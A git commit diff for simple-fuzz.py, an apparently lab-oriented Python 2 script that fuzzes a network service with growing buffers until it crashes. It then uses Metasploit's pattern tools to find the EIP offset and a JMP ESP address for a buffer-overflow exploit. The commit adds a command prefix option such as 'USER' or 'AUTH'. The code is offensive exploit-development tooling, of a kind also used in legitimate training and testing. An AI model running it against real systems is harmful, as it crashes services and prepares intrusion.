a6e14db667dacce4f058b9270d16ee8a482763ab
Adrian <TheGrimmSqueaker@gmail.com>
2019-05-21 13:46:24 -0500

    Update simple-fuzz.py
    Added prefix flag functionality.

--- simple-fuzz.py
+++ simple-fuzz.py
@@ -4,17 +4,24 @@ import argparse, socket, sys, commands, time
 parser = argparse.ArgumentParser()
 parser.add_argument("-t","--target",type=str,metavar="",help="Target IP address")
 parser.add_argument("-p","--port", type=int, metavar="",help="Target port")
+parser.add_argument("-P","--prefix",type=str,metavar="",help="Payload prefix such as \"USER\" or \"AUTH\"")
 parser.add_argument("--version", action="version", version="%(prog)s 0.1(I'm really winging this)")
 input = parser.parse_args()
 
-if (len(sys.argv) < 4):
-	parser.print_help()
-	sys.exit(0)
 
 bof = ""
 jmpesp = ""
 buffer=["A"]
 counter = 100
+if (len(sys.argv) < 4):
+	parser.print_help()
+	sys.exit(0)
+
+if input.prefix is not None:
+	prefix = input.prefix + " "
+else:
+	prefix = ""
+
 while len(buffer) <= 30:
 	buffer.append("A"*counter)
 	counter += 200
@@ -28,9 +35,13 @@ for string in buffer:
 		s.settimeout(3.0)
 		connect = s.connect((input.target, input.port))
 		s.recv(1024)
-		s.send("" + string)
+		s.send(prefix + string)
 		s.close()
 	except socket.timeout:
+		print "Program crashed at %s bytes" % len(string)
+		bof = len(string)
+		break
+	except socket.error:
 		print "Program crashed at %s bytes" % len(string)
 		bof = len(string)
 		break
@@ -40,25 +51,34 @@ print "# CALLING ON PATTERN_CREATE #"
 print "#############################"
 #Call on pattern_create.rb
 pattern_create = commands.getoutput("/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l %s " % bof)
+print "[*]DONE!"
+
 print "Please restart the crashed app before continuing"
 raw_input("Press Enter to continue...")
+print "#############################"
+print "#   FUZZING WITH PATTERN    #"
+print "#############################"
 try:
 	print "Fuzzing " + input.target + " with our pattern_create payload of %s bytes!" % len(pattern_create)
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.settimeout(3.0)
 	connect = s.connect((input.target,input.port))
 	s.recv(1024)
-	s.send("" + pattern_create)
+	s.send(prefix + pattern_create)
 	s.close()
 except socket.timeout:
 	print "I think you forgot to restart the application"
-	sys.exit(0)	
+	sys.exit(0)
+except socket.error:
+	print "Program has crashed! Please note the value of the EIP register."
+	
 print "Program has crashed! Please note the value of the EIP register."
 eip = raw_input("Enter the EIP now: ")
 print "##############################"
 print "#     CALCULATING OFFSET     #"
 print "##############################"
 offset = commands.getoutput("/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l %(1)s -q %(2)s | cut -d \" \" -f 6" % {"1" : bof, "2" : eip})
+print "[*]DONE!"
 
 print "##############################"
 print "#  LOCATE VULNERABLE MODULE  #"
@@ -66,6 +86,7 @@ print "##############################"
 print "Use '!mona modules' to search for a module without DEP or ASLR"
 print "and that has a memory range that doesn't contain bad characters"
 raw_input("Press enter to continue...")
+
 print "##############################"
 print "#  FIND JMP ESP INSTRUCTION  #"
 print "##############################"
@@ -83,5 +104,8 @@ jmpesp = jmpesp[:12] + '\\x' + jmpesp[12:]
 print "###############################"
 print "#     SCRIPT IS FINISHED!     #"
 print "###############################"
+print "Run the msfvenom command and replace the variables in fuzzsploit.py with the following: "
 print "[*] offset = %s" % offset
 print "[*] jmpesp = %s" % jmpesp
+
+
